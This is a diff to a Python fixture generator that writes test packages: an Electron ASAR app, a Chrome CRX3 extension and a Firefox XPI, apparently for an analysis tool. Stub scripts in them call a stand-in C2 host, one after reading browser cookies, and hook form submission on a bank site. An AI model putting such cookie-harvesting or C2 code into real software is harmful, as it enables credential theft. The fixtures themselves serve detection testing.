@@ -1,6 +1,7 @@
 """Variantes dos PEs de teste (item 7.1): Rich header, checksum, overlay e UPX disfarcado."""
 import hashlib
 import io
+import json
 import shutil
 import struct
 import sys
@@ -156,4 +157,67 @@ open(f'{W}/xor4-dropper.exe', 'wb').write(
 )
 # Arquivo sem tipo com o PE em claro no meio (o binwalk acha).
 open(f'{W}/embutido.bin', 'wb').write(filler(1000, b'embutido') + prog32 + filler(500, b'fim'))
+
+
+# Pacotes da web (item 20): ASAR do Electron, extensao do Chrome (CRX3) e do Firefox (XPI).
+def asar(entries):
+    tree, blobs, offset = {'files': {}}, b'', 0
+    for path, data in entries:
+        node = tree
+        parts = path.split('/')
+        for part in parts[:-1]:
+            node = node['files'].setdefault(part, {'files': {}})
+        node['files'][parts[-1]] = {'size': len(data), 'offset': str(offset)}
+        blobs += data
+        offset += len(data)
+    raw = json.dumps(tree, separators=(',', ':')).encode()
+    padded = raw + b'\0' * (-len(raw) % 4)
+    payload = struct.pack('<I', len(raw)) + padded
+    header = struct.pack('<I', len(payload)) + payload
+    return struct.pack('<II', 4, len(header)) + header + blobs
+
+
+open(f'{W}/app.asar', 'wb').write(asar([
+    ('package.json', b'{"name":"carteira","version":"2.1.0","main":"main.js"}'),
+    ('main.js', b'const { app } = require("electron");\nrequire("./lib/rede.js");\n'),
+    ('lib/rede.js', b'fetch("https://c2.exemplo.invalid/coleta", { method: "POST" });\n'),
+    ('node_modules/leftpad/index.js', b'module.exports = (s) => s;\n'),
+    ('build/nativo.node', open(f'{W}/teste.dll', 'rb').read()),
+    ('assets/logo.png', b'\x89PNG\r\n\x1a\n' + b'\0' * 64),
+]))
+
+
+def zip_of(entries):
+    buf = io.BytesIO()
+    with zipfile.ZipFile(buf, 'w') as z:
+        for name, data in entries:
+            # O manifesto sem compressao: o tipo XPI e reconhecido pelo texto "gecko" nele.
+            z.writestr(name, data, zipfile.ZIP_STORED if name == 'manifest.json' else zipfile.ZIP_DEFLATED)
+    return buf.getvalue()
+
+
+chrome = zip_of([
+    ('manifest.json', json.dumps({
+        'manifest_version': 3, 'name': 'Cupons Rapidos', 'version': '1.4',
+        'permissions': ['cookies', 'scripting', 'storage'],
+        'host_permissions': ['<all_urls>'],
+        'content_scripts': [{'matches': ['https://*.banco.example/*'], 'js': ['injeta.js']}],
+        'background': {'service_worker': 'fundo.js'},
+        'update_url': 'https://atualiza.exemplo.invalid/crx.xml',
+    }).encode()),
+    ('injeta.js', b'document.querySelector("form").addEventListener("submit", () => {});\n'),
+    ('fundo.js', b'chrome.cookies.getAll({}, (c) => fetch("https://c2.exemplo.invalid/c"));\n'),
+    ('icone.png', b'\x89PNG\r\n\x1a\n' + b'\0' * 64),
+])
+proto = b'\x12\x10' + bytes(range(16))  # cabecalho CRX3 (protobuf) qualquer: o leitor so pula
+open(f'{W}/extensao.crx', 'wb').write(b'Cr24' + struct.pack('<II', 3, len(proto)) + proto + chrome)
+open(f'{W}/extensao.xpi', 'wb').write(zip_of([
+    ('manifest.json', json.dumps({
+        'manifest_version': 2, 'name': 'Bloqueador', 'version': '0.9',
+        'permissions': ['webRequest', 'webRequestBlocking', '<all_urls>', 'storage'],
+        'background': {'scripts': ['bg.js']},
+        'browser_specific_settings': {'gecko': {'id': 'bloqueador@exemplo.invalid'}},
+    }).encode()),
+    ('bg.js', b'browser.webRequest.onBeforeRequest.addListener(() => {}, { urls: ["<all_urls>"] });\n'),
+]))
 
